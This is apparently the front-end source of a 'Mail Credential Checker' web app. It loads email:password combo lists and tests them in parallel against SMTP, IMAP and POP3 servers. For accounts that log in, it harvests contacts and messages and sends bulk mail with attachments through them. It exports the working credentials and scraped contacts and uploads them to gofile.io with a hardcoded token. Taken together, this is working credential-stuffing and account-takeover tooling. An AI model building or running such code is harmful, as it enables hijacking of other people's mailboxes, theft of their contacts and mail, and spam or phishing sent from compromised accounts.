"use client";

import { useEffect, useMemo, useRef, useState } from "react";
import { parseCredentials, dedupeCredentials, type Credential } from "@/lib/parse";

type Status = "pending" | "checking" | "valid" | "invalid" | "error";

interface Row {
  email: string;
  password: string;
  status: Status;
  smtp?: "ok" | "fail" | "skip";
  imap?: "ok" | "fail" | "skip";
  pop3?: "ok" | "fail" | "skip";
  send?: "ok" | "fail" | "skip" | "pending";
  sendInfo?: string;
  host?: string;
  error?: string;
  errorCategory?: string;
  contactsFound?: number;
  elapsedMs?: number;
}

interface Contact {
  name?: string;
  email: string;
  source: string;
  folder: string;
  owner: string;
  phone?: string;
  org?: string;
}

interface DnsAuthSnapshot {
  domain: string;
  score: number;
  spfPresent: boolean;
  dmarcPresent: boolean;
  dkimPresent: boolean;
  notes: string[];
}

export default function Page() {
  const [raw, setRaw] = useState("");
  const [rows, setRows] = useState<Row[]>([]);
  const [busy, setBusy] = useState(false);
  const [concurrency, setConcurrency] = useState(4);
  const [wantSmtp, setWantSmtp] = useState(true);
  const [wantImap, setWantImap] = useState(true);
  const [wantPop3, setWantPop3] = useState(false);
  const [autoExtract, setAutoExtract] = useState(false);
  const [includeCardDav, setIncludeCardDav] = useState(false);
  const [autoDns, setAutoDns] = useState(true);
  const [maxMessages, setMaxMessages] = useState(300);
  const [batchId, setBatchId] = useState<string | null>(null);
  const [batchName, setBatchName] = useState("");
  const [dbEnabled, setDbEnabled] = useState<boolean | null>(null);
  const [dnsCache, setDnsCache] = useState<Record<string, DnsAuthSnapshot>>({});
  const [searchQuery, setSearchQuery] = useState("");
  const [searchResults, setSearchResults] = useState<any[]>([]);
  const [webhookUrl, setWebhookUrl] = useState("");
  const [webhooks, setWebhooks] = useState<any[]>([]);
  const [sendHtml, setSendHtml] = useState("");
  const [sendAttachments, setSendAttachments] = useState<Array<{ filename: string; content: string; isBase64: boolean; contentType?: string; sizeLabel: string }>>([]);
  const [contacts, setContacts] = useState<Contact[]>([]);
  const [log, setLog] = useState<string[]>([]);
  const [gofileToken, setGofileToken] = useState("Vlgj7YMQ9wNLJKOGdnJoycIfRxS8sSkY");
  const [gofileFolder, setGofileFolder] = useState("");
  const [sendRecipients, setSendRecipients] = useState("");
  const [sendSubject, setSendSubject] = useState("SMTP test");
  const [sendBody, setSendBody] = useState("This is an automated SMTP deliverability test.");
  const [sendFromName, setSendFromName] = useState("");
  const [autoSend, setAutoSend] = useState(false);
  const cancelRef = useRef(false);

  const recipientList = useMemo(
    () =>
      sendRecipients
        .split(/[\s,;]+/)
        .map((s) => s.trim())
        .filter((s) => /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(s)),
    [sendRecipients],
  );

  const stats = useMemo(() => {
    const s = { total: rows.length, valid: 0, invalid: 0, pending: 0, checking: 0, error: 0 };
    for (const r of rows) (s as any)[r.status]++;
    return s;
  }, [rows]);

  function appendLog(line: string) {
    setLog((l) => [...l.slice(-200), `[${new Date().toLocaleTimeString()}] ${line}`]);
  }

  // Check DB availability + load initial webhooks.
  useEffect(() => {
    fetch("/api/batches").then(async (r) => {
      const j = await r.json();
      setDbEnabled(!!j.enabled);
    }).catch(() => setDbEnabled(false));
    fetch("/api/webhooks").then(async (r) => {
      const j = await r.json();
      if (j.enabled) setWebhooks(j.webhooks || []);
    }).catch(() => {});
  }, []);

  async function createNewBatch() {
    try {
      const r = await fetch("/api/batches", {
        method: "POST",
        headers: { "content-type": "application/json" },
        body: JSON.stringify({ name: batchName || `batch-${Date.now()}` }),
      });
      const j = await r.json();
      if (j.id) {
        setBatchId(j.id);
        appendLog(`Batch created: ${j.id}`);
      } else {
        appendLog(`Batch create failed: ${j.error || "unknown"}`);
      }
    } catch (e: any) {
      appendLog(`Batch error: ${String(e?.message || e)}`);
    }
  }

  async function checkDnsForDomain(domain: string) {
    if (!domain || dnsCache[domain]) return;
    try {
      const r = await fetch("/api/dns-auth", {
        method: "POST",
        headers: { "content-type": "application/json" },
        body: JSON.stringify({ domain }),
      });
      const j = await r.json();
      setDnsCache((prev) => ({
        ...prev,
        [domain]: {
          domain: j.domain,
          score: j.score,
          spfPresent: j.spf?.present,
          dmarcPresent: j.dmarc?.present,
          dkimPresent: j.dkim?.present,
          notes: j.notes || [],
        },
      }));
    } catch {
      // silent
    }
  }

  async function addAttachment(ev: React.ChangeEvent<HTMLInputElement>) {
    const files = ev.target.files;
    if (!files) return;
    for (const f of Array.from(files)) {
      if (f.size > 5 * 1024 * 1024) {
        appendLog(`Attachment too large (>5MB): ${f.name}`);
        continue;
      }
      const buf = await f.arrayBuffer();
      let b64 = "";
      const bytes = new Uint8Array(buf);
      const chunk = 0x8000;
      for (let i = 0; i < bytes.length; i += chunk) {
        b64 += String.fromCharCode.apply(null, Array.from(bytes.subarray(i, i + chunk)));
      }
      setSendAttachments((prev) => [
        ...prev,
        { filename: f.name, content: btoa(b64), isBase64: true, contentType: f.type || undefined, sizeLabel: `${Math.ceil(f.size / 1024)} KB` },
      ]);
    }
    ev.target.value = "";
  }

  async function doSearch() {
    const q = searchQuery.trim();
    if (!q) return setSearchResults([]);
    const r = await fetch(`/api/search?q=${encodeURIComponent(q)}`);
    const j = await r.json();
    setSearchResults(j.results || []);
  }

  async function addWebhook() {
    if (!webhookUrl) return;
    const r = await fetch("/api/webhooks", {
      method: "POST",
      headers: { "content-type": "application/json" },
      body: JSON.stringify({ url: webhookUrl }),
    });
    const j = await r.json();
    if (j.id) {
      setWebhooks((prev) => [...prev, j]);
      setWebhookUrl("");
      appendLog(`Webhook added: ${j.url}`);
    } else {
      appendLog(`Webhook add failed: ${j.error || "unknown"}`);
    }
  }

  async function removeWebhook(id: string) {
    await fetch(`/api/webhooks?id=${encodeURIComponent(id)}`, { method: "DELETE" });
    setWebhooks((prev) => prev.filter((w) => w.id !== id));
  }

  async function onUpload(ev: React.ChangeEvent<HTMLInputElement>) {
    const files = ev.target.files;
    if (!files) return;
    const chunks: string[] = [];
    for (const f of Array.from(files)) chunks.push(await f.text());
    setRaw((prev) => (prev ? prev + "\n" + chunks.join("\n") : chunks.join("\n")));
    ev.target.value = "";
  }

  function loadFromText() {
    const creds = dedupeCredentials(parseCredentials(raw));
    setRows(
      creds.map((c) => ({
        email: c.email,
        password: c.password,
        status: "pending",
      })),
    );
    setContacts([]);
    appendLog(`Loaded ${creds.length} credentials`);
  }

  async function checkOne(idx: number, r: Row) {
    setRows((prev) => {
      const n = [...prev];
      n[idx] = { ...n[idx], status: "checking" };
      return n;
    });
    try {
      const protocols: string[] = [];
      if (wantSmtp) protocols.push("smtp");
      if (wantImap) protocols.push("imap");
      if (wantPop3) protocols.push("pop3");
      const res = await fetch("/api/verify", {
        method: "POST",
        headers: { "content-type": "application/json" },
        body: JSON.stringify({ email: r.email, password: r.password, protocols, batchId }),
      });
      const j = await res.json();
      const smtp: Row["smtp"] = wantSmtp ? (j.smtp?.ok ? "ok" : "fail") : "skip";
      const imap: Row["imap"] = wantImap ? (j.imap?.ok ? "ok" : "fail") : "skip";
      const pop3: Row["pop3"] = wantPop3 ? (j.pop3?.ok ? "ok" : "fail") : "skip";
      const ok = j.ok;
      const host = j.imap?.host || j.smtp?.host || j.pop3?.host;
      const firstErr = j.imap?.error || j.smtp?.error || j.pop3?.error;
      const update: Row = {
        ...r,
        status: ok ? "valid" : "invalid",
        smtp,
        imap,
        pop3,
        host,
        error: ok ? undefined : (typeof firstErr === "object" ? firstErr?.message : firstErr) || j.error,
        errorCategory: ok ? undefined : (typeof firstErr === "object" ? firstErr?.category : undefined),
        elapsedMs: j.elapsedMs,
      };
      setRows((prev) => {
        const n = [...prev];
        n[idx] = update;
        return n;
      });

      if (autoDns) {
        const d = r.email.split("@")[1];
        if (d) checkDnsForDomain(d);
      }
      if (ok && autoSend && wantSmtp && j.smtp?.ok && recipientList.length) {
        await sendTestOne(idx, update);
      }
      if (ok && autoExtract && wantImap && j.imap?.ok) {
        await extractOne(idx, update);
      }
    } catch (e: any) {
      setRows((prev) => {
        const n = [...prev];
        n[idx] = { ...n[idx], status: "error", error: String(e?.message || e) };
        return n;
      });
    }
  }

  async function sendTestOne(idx: number, r: Row) {
    if (!recipientList.length) {
      appendLog("No recipients configured — skipping send test");
      return;
    }
    setRows((prev) => {
      const n = [...prev];
      n[idx] = { ...n[idx], send: "pending" };
      return n;
    });
    try {
      const res = await fetch("/api/send-test", {
        method: "POST",
        headers: { "content-type": "application/json" },
        body: JSON.stringify({
          email: r.email,
          password: r.password,
          to: recipientList,
          subject: sendSubject,
          text: sendBody,
          html: sendHtml || undefined,
          attachments: sendAttachments.length ? sendAttachments.map(({ sizeLabel: _s, ...rest }) => rest) : undefined,
          fromName: sendFromName || undefined,
          batchId,
        }),
      });
      const j = await res.json();
      const accepted: string[] = j.accepted || [];
      const rejected: string[] = j.rejected || [];
      const info = j.ok
        ? `accepted ${accepted.length}/${recipientList.length}${rejected.length ? ` (rejected: ${rejected.join(", ")})` : ""}`
        : (j.error || j.response || "send failed").slice(0, 200);
      setRows((prev) => {
        const n = [...prev];
        n[idx] = { ...n[idx], send: j.ok ? "ok" : "fail", sendInfo: info };
        return n;
      });
      appendLog(`Send ${r.email} → ${j.ok ? "OK" : "FAIL"}: ${info}`);
    } catch (e: any) {
      const info = String(e?.message || e);
      setRows((prev) => {
        const n = [...prev];
        n[idx] = { ...n[idx], send: "fail", sendInfo: info };
        return n;
      });
      appendLog(`Send error ${r.email}: ${info}`);
    }
  }

  async function sendTestAllValid() {
    if (!recipientList.length) {
      appendLog("Add at least one recipient before sending");
      return;
    }
    setBusy(true);
    cancelRef.current = false;
    const targets = rows
      .map((r, i) => ({ r, i }))
      .filter((x) => x.r.status === "valid" && x.r.smtp === "ok");
    const pool = Math.max(1, Math.min(8, concurrency));
    let cursor = 0;
    const workers = Array.from({ length: pool }, async () => {
      while (!cancelRef.current) {
        const mine = cursor++;
        if (mine >= targets.length) return;
        const { r, i } = targets[mine];
        await sendTestOne(i, r);
      }
    });
    await Promise.all(workers);
    setBusy(false);
    appendLog("Send run finished");
  }

  async function extractOne(idx: number, r: Row) {
    try {
      const res = await fetch("/api/extract", {
        method: "POST",
        headers: { "content-type": "application/json" },
        body: JSON.stringify({ email: r.email, password: r.password, maxMessages, includeCardDav, batchId }),
      });
      const j = await res.json();
      const list: Contact[] = (j.contacts || []).map((c: any) => ({
        owner: r.email,
        email: c.email,
        name: c.name,
        phone: c.phone,
        org: c.org,
        source: c.source,
        folder: c.folder,
      }));
      setContacts((prev) => {
        const seen = new Set(prev.map((p) => p.owner + "\0" + p.email));
        const merged = [...prev];
        for (const c of list) {
          const k = c.owner + "\0" + c.email;
          if (!seen.has(k)) {
            seen.add(k);
            merged.push(c);
          }
        }
        return merged;
      });
      setRows((prev) => {
        const n = [...prev];
        n[idx] = { ...n[idx], contactsFound: list.length };
        return n;
      });
      const cardNote = j.carddav?.ok ? `, carddav:${j.counts?.carddav ?? 0}` : (j.carddav ? `, carddav error: ${j.carddav.error}` : "");
      appendLog(`Extracted ${list.length} contacts from ${r.email} (imap scanned ${j.imap?.messagesScanned ?? 0}${cardNote})`);
    } catch (e: any) {
      appendLog(`Extract failed for ${r.email}: ${String(e?.message || e)}`);
    }
  }

  async function runChecks() {
    if (!rows.length || busy) return;
    cancelRef.current = false;
    setBusy(true);
    const queue = rows.map((r, i) => ({ r, i })).filter((x) => x.r.status === "pending" || x.r.status === "error");
    let cursor = 0;
    const workers = Array.from({ length: Math.max(1, Math.min(16, concurrency)) }, async () => {
      while (!cancelRef.current) {
        const mine = cursor++;
        if (mine >= queue.length) return;
        const { r, i } = queue[mine];
        await checkOne(i, r);
      }
    });
    await Promise.all(workers);
    setBusy(false);
    appendLog("Run finished");
  }

  function stop() {
    cancelRef.current = true;
    appendLog("Stop requested");
  }

  async function extractAllValid() {
    setBusy(true);
    const targets = rows
      .map((r, i) => ({ r, i }))
      .filter((x) => x.r.status === "valid" && x.r.imap === "ok");
    for (const { r, i } of targets) {
      if (cancelRef.current) break;
      await extractOne(i, r);
    }
    setBusy(false);
  }

  function validCombos(): string {
    return rows
      .filter((r) => r.status === "valid")
      .map((r) => `${r.email}:${r.password}`)
      .join("\n");
  }

  function allAddresses(): string {
    const set = new Set<string>();
    for (const r of rows) if (r.status === "valid") set.add(r.email);
    for (const c of contacts) set.add(c.email);
    return [...set].sort().join("\n");
  }

  function contactsCsv(): string {
    const header = "owner,name,email,phone,org,source,folder";
    const rows = contacts.map((c) =>
      [c.owner, c.name || "", c.email, c.phone || "", c.org || "", c.source, c.folder]
        .map((v) => `"${String(v).replace(/"/g, '""')}"`)
        .join(","),
    );
    return [header, ...rows].join("\n");
  }

  function validCsv(): string {
    const header = "email,password,smtp,imap,host,error";
    const lines = rows
      .filter((r) => r.status === "valid")
      .map((r) =>
        [r.email, r.password, r.smtp || "", r.imap || "", r.host || "", r.error || ""]
          .map((v) => `"${String(v).replace(/"/g, '""')}"`)
          .join(","),
      );
    return [header, ...lines].join("\n");
  }

  function download(name: string, text: string) {
    const blob = new Blob([text], { type: "text/plain;charset=utf-8" });
    const url = URL.createObjectURL(blob);
    const a = document.createElement("a");
    a.href = url;
    a.download = name;
    a.click();
    URL.revokeObjectURL(url);
  }

  async function uploadCloud(name: string, text: string) {
    appendLog(`Uploading ${name} to gofile.io...`);
    try {
      const res = await fetch("/api/upload-gofile", {
        method: "POST",
        headers: { "content-type": "application/json" },
        body: JSON.stringify({
          filename: name,
          content: text,
          token: gofileToken || undefined,
          folderId: gofileFolder || undefined,
        }),
      });
      const j = await res.json();
      if (j.ok) {
        appendLog(`Uploaded: ${j.downloadPage}`);
        window.open(j.downloadPage, "_blank", "noopener");
      } else {
        appendLog(`Upload failed: ${j.error}`);
      }
    } catch (e: any) {
      appendLog(`Upload error: ${String(e?.message || e)}`);
    }
  }

  return (
    <div className="container">
      <h1>Mail Credential Checker</h1>
      <div className="sub">Upload email:password lists, verify over SMTP/IMAP, extract contacts, export results.</div>

      <div className="card">
        <div className="row" style={{ marginBottom: 8 }}>
          <input type="file" multiple onChange={onUpload} />
          <button className="secondary" onClick={loadFromText}>Parse text</button>
          <span className="hint">Format: email:password (one per line)</span>
        </div>
        <textarea
          placeholder="user@example.com:password"
          value={raw}
          onChange={(e) => setRaw(e.target.value)}
        />
      </div>

      <div className="card">
        <div className="row">
          <strong>Batch</strong>
          <span className="hint">{dbEnabled === null ? "..." : dbEnabled ? "DB connected — results are persisted, audit/webhooks/dashboard/search enabled" : "DB not configured — client-only mode"}</span>
          <div className="grow" />
          <a href="/dashboard" className="pill">Dashboard →</a>
        </div>
        {dbEnabled ? (
          <div className="row" style={{ marginTop: 8 }}>
            <label className="grow">Batch name<input type="text" value={batchName} onChange={(e) => setBatchName(e.target.value)} placeholder="e.g. audit-2026-04-23" /></label>
            <button className="secondary" onClick={createNewBatch}>Create batch</button>
            <span className="hint mono">{batchId ? `active: ${batchId.slice(0, 8)}...` : "no active batch"}</span>
          </div>
        ) : null}
      </div>

      <div className="card">
        <div className="row">
          <label><input type="checkbox" checked={wantSmtp} onChange={(e) => setWantSmtp(e.target.checked)} /> SMTP</label>
          <label><input type="checkbox" checked={wantImap} onChange={(e) => setWantImap(e.target.checked)} /> IMAP</label>
          <label><input type="checkbox" checked={wantPop3} onChange={(e) => setWantPop3(e.target.checked)} /> POP3</label>
          <label><input type="checkbox" checked={autoDns} onChange={(e) => setAutoDns(e.target.checked)} /> Auto DNS-auth (SPF/DKIM/DMARC)</label>
          <label><input type="checkbox" checked={autoSend} onChange={(e) => setAutoSend(e.target.checked)} /> Auto-send test on success</label>
          <label><input type="checkbox" checked={autoExtract} onChange={(e) => setAutoExtract(e.target.checked)} /> Auto-extract on success</label>
          <label><input type="checkbox" checked={includeCardDav} onChange={(e) => setIncludeCardDav(e.target.checked)} /> Include CardDAV on extract</label>
          <label>Concurrency <input type="number" min={1} max={16} value={concurrency} onChange={(e) => setConcurrency(parseInt(e.target.value) || 1)} style={{ width: 70 }} /></label>
          <label>Max messages/acct <input type="number" min={10} max={5000} value={maxMessages} onChange={(e) => setMaxMessages(parseInt(e.target.value) || 100)} style={{ width: 90 }} /></label>
          <div className="grow" />
          {!busy
            ? <button onClick={runChecks} disabled={!rows.length}>Run checks</button>
            : <button className="secondary" onClick={stop}>Stop</button>}
          <button className="secondary" onClick={sendTestAllValid} disabled={busy || !recipientList.length || !rows.some((r) => r.status === "valid" && r.smtp === "ok")}>Send test to all valid</button>
          <button className="secondary" onClick={extractAllValid} disabled={busy || !rows.some((r) => r.status === "valid")}>Extract all valid</button>
        </div>
        <div className="row" style={{ marginTop: 8 }}>
          <span className="pill">Total {stats.total}</span>
          <span className="pill ok">Valid {stats.valid}</span>
          <span className="pill bad">Invalid {stats.invalid}</span>
          <span className="pill wait">Checking {stats.checking}</span>
          <span className="pill">Pending {stats.pending}</span>
          {stats.error ? <span className="pill bad">Errors {stats.error}</span> : null}
          <span className="pill">Contacts {contacts.length}</span>
        </div>
      </div>

      <div className="card">
        <div className="row" style={{ marginBottom: 8 }}>
          <strong>Send test email</strong>
          <span className="hint">
            {recipientList.length
              ? `${recipientList.length} recipient${recipientList.length > 1 ? "s" : ""} ready`
              : "Add at least one recipient"}
          </span>
        </div>
        <label>Recipients (comma, semicolon, space, or newline separated)
          <textarea
            placeholder="dest1@example.com, dest2@example.com"
            value={sendRecipients}
            onChange={(e) => setSendRecipients(e.target.value)}
            style={{ minHeight: 60 }}
          />
        </label>
        <div className="row" style={{ marginTop: 8 }}>
          <label className="grow">Subject<input type="text" value={sendSubject} onChange={(e) => setSendSubject(e.target.value)} /></label>
          <label className="grow">From name (optional)<input type="text" value={sendFromName} onChange={(e) => setSendFromName(e.target.value)} placeholder="e.g. Tester" /></label>
        </div>
        <label style={{ marginTop: 8, display: "block" }}>Body (plain text)
          <textarea value={sendBody} onChange={(e) => setSendBody(e.target.value)} style={{ minHeight: 60 }} />
        </label>
        <label style={{ marginTop: 8, display: "block" }}>Body (HTML, optional)
          <textarea value={sendHtml} onChange={(e) => setSendHtml(e.target.value)} style={{ minHeight: 60 }} placeholder="<p>Hello</p>" />
        </label>
        <div className="row" style={{ marginTop: 8 }}>
          <label>Attachments <input type="file" multiple onChange={addAttachment} /></label>
          <span className="hint">Max 5MB each</span>
        </div>
        {sendAttachments.length ? (
          <div className="row" style={{ marginTop: 4 }}>
            {sendAttachments.map((a, i) => (
              <span key={i} className="pill">
                {a.filename} · {a.sizeLabel}{" "}
                <button className="ghost" style={{ padding: "0 6px" }} onClick={() => setSendAttachments((prev) => prev.filter((_, j) => j !== i))}>×</button>
              </span>
            ))}
          </div>
        ) : null}
      </div>

      {dbEnabled ? (
        <div className="card">
          <div className="row" style={{ marginBottom: 8 }}>
            <strong>Search extracted messages</strong>
            <span className="hint">Postgres full-text (tsvector)</span>
          </div>
          <div className="row">
            <input className="grow" type="text" value={searchQuery} onChange={(e) => setSearchQuery(e.target.value)} placeholder="query..." onKeyDown={(e) => { if (e.key === "Enter") doSearch(); }} />
            <button onClick={doSearch}>Search</button>
          </div>
          {searchResults.length ? (
            <div className="scroll" style={{ marginTop: 8 }}>
              <table>
                <thead><tr><th>Subject</th><th>From</th><th>Folder</th><th>Snippet</th></tr></thead>
                <tbody>
                  {searchResults.map((m: any, i: number) => (
                    <tr key={i}>
                      <td className="mono">{m.subject || ""}</td>
                      <td className="mono">{m.from_addr || ""}</td>
                      <td className="mono">{m.folder || ""}</td>
                      <td dangerouslySetInnerHTML={{ __html: m.snippet || "" }} />
                    </tr>
                  ))}
                </tbody>
              </table>
            </div>
          ) : null}
        </div>
      ) : null}

      {dbEnabled ? (
        <div className="card">
          <div className="row" style={{ marginBottom: 8 }}>
            <strong>Webhooks</strong>
            <span className="hint">HMAC-SHA256 signed via <span className="mono">x-webhook-signature</span></span>
          </div>
          <div className="row">
            <input className="grow" type="text" value={webhookUrl} onChange={(e) => setWebhookUrl(e.target.value)} placeholder="https://example.com/hook" />
            <button onClick={addWebhook}>Add</button>
          </div>
          {webhooks.length ? (
            <table style={{ marginTop: 8 }}>
              <thead><tr><th>URL</th><th>Events</th><th>Secret</th><th /></tr></thead>
              <tbody>
                {webhooks.map((w) => (
                  <tr key={w.id}>
                    <td className="mono">{w.url}</td>
                    <td className="mono">{(w.events || []).join(", ")}</td>
                    <td className="mono">{w.secret?.slice(0, 10)}…</td>
                    <td><button className="ghost" onClick={() => removeWebhook(w.id)}>remove</button></td>
                  </tr>
                ))}
              </tbody>
            </table>
          ) : null}
        </div>
      ) : null}

      {Object.keys(dnsCache).length ? (
        <div className="card">
          <strong>DNS auth (SPF / DKIM / DMARC)</strong>
          <table style={{ marginTop: 8 }}>
            <thead><tr><th>Domain</th><th>Score</th><th>SPF</th><th>DKIM</th><th>DMARC</th><th>Notes</th></tr></thead>
            <tbody>
              {Object.values(dnsCache).map((d) => (
                <tr key={d.domain}>
                  <td className="mono">{d.domain}</td>
                  <td className="mono">{d.score}/100</td>
                  <td><span className={`pill ${d.spfPresent ? "ok" : "bad"}`}>{d.spfPresent ? "yes" : "no"}</span></td>
                  <td><span className={`pill ${d.dkimPresent ? "ok" : "bad"}`}>{d.dkimPresent ? "yes" : "no"}</span></td>
                  <td><span className={`pill ${d.dmarcPresent ? "ok" : "bad"}`}>{d.dmarcPresent ? "yes" : "no"}</span></td>
                  <td className="mono">{d.notes.join(" · ")}</td>
                </tr>
              ))}
            </tbody>
          </table>
        </div>
      ) : null}

      <div className="card">
        <div className="row" style={{ marginBottom: 8 }}>
          <strong>Export</strong>
          <button className="secondary" onClick={() => download("valid.txt", validCombos())} disabled={!stats.valid}>valid.txt</button>
          <button className="secondary" onClick={() => download("valid.csv", validCsv())} disabled={!stats.valid}>valid.csv</button>
          <button className="secondary" onClick={() => download("addresses.txt", allAddresses())} disabled={!stats.valid && !contacts.length}>addresses.txt</button>
          <button className="secondary" onClick={() => download("contacts.csv", contactsCsv())} disabled={!contacts.length}>contacts.csv</button>
          <div className="grow" />
        </div>
        <div className="row">
          <label className="grow">gofile token<input type="text" value={gofileToken} onChange={(e) => setGofileToken(e.target.value)} placeholder="Account Token" /></label>
          <label className="grow">gofile folderId (optional)<input type="text" value={gofileFolder} onChange={(e) => setGofileFolder(e.target.value)} placeholder="folder id" /></label>
        </div>
        <div className="row" style={{ marginTop: 8 }}>
          <button onClick={() => uploadCloud("valid.txt", validCombos())} disabled={!stats.valid}>Upload valid.txt</button>
          <button onClick={() => uploadCloud("valid.csv", validCsv())} disabled={!stats.valid}>Upload valid.csv</button>
          <button onClick={() => uploadCloud("addresses.txt", allAddresses())} disabled={!stats.valid && !contacts.length}>Upload addresses.txt</button>
          <button onClick={() => uploadCloud("contacts.csv", contactsCsv())} disabled={!contacts.length}>Upload contacts.csv</button>
        </div>
      </div>

      <div className="card">
        <strong>Accounts</strong>
        <div className="scroll" style={{ marginTop: 8 }}>
          <table>
            <thead>
              <tr>
                <th>#</th>
                <th>Email</th>
                <th>Status</th>
                <th>SMTP</th>
                <th>IMAP</th>
                <th>POP3</th>
                <th>Send</th>
                <th>Host</th>
                <th>Contacts</th>
                <th>Category</th>
                <th>Info</th>
              </tr>
            </thead>
            <tbody>
              {rows.map((r, i) => (
                <tr key={`${r.email}:${i}`}>
                  <td className="mono">{i + 1}</td>
                  <td className="mono">{r.email}</td>
                  <td>
                    <span className={`pill ${r.status === "valid" ? "ok" : r.status === "invalid" ? "bad" : r.status === "checking" ? "wait" : ""}`}>
                      {r.status}
                    </span>
                  </td>
                  <td><span className="mono">{r.smtp || ""}</span></td>
                  <td><span className="mono">{r.imap || ""}</span></td>
                  <td><span className="mono">{r.pop3 || ""}</span></td>
                  <td>
                    {r.send ? (
                      <span className={`pill ${r.send === "ok" ? "ok" : r.send === "fail" ? "bad" : "wait"}`}>{r.send}</span>
                    ) : null}
                  </td>
                  <td className="mono">{r.host || ""}</td>
                  <td className="mono">{r.contactsFound ?? ""}</td>
                  <td className="mono">{r.errorCategory || ""}</td>
                  <td className="mono error" title={r.sendInfo || r.error || ""}>{(r.sendInfo || r.error || "").slice(0, 140)}</td>
                </tr>
              ))}
            </tbody>
          </table>
        </div>
      </div>

      {contacts.length ? (
        <div className="card">
          <strong>Contacts ({contacts.length})</strong>
          <div className="scroll" style={{ marginTop: 8 }}>
            <table>
              <thead>
                <tr>
                  <th>Owner</th>
                  <th>Name</th>
                  <th>Email</th>
                  <th>Phone</th>
                  <th>Org</th>
                  <th>Source</th>
                  <th>Folder</th>
                </tr>
              </thead>
              <tbody>
                {contacts.slice(0, 2000).map((c, i) => (
                  <tr key={i}>
                    <td className="mono">{c.owner}</td>
                    <td>{c.name || ""}</td>
                    <td className="mono">{c.email}</td>
                    <td className="mono">{c.phone || ""}</td>
                    <td>{c.org || ""}</td>
                    <td className="mono">{c.source}</td>
                    <td className="mono">{c.folder}</td>
                  </tr>
                ))}
              </tbody>
            </table>
          </div>
          {contacts.length > 2000 ? <div className="hint">Showing first 2000 rows. Export to see all.</div> : null}
        </div>
      ) : null}

      <div className="card">
        <strong>Log</strong>
        <pre className="mono" style={{ whiteSpace: "pre-wrap", margin: 0, maxHeight: 200, overflow: "auto" }}>
          {log.join("\n")}
        </pre>
      </div>
    </div>
  );
}
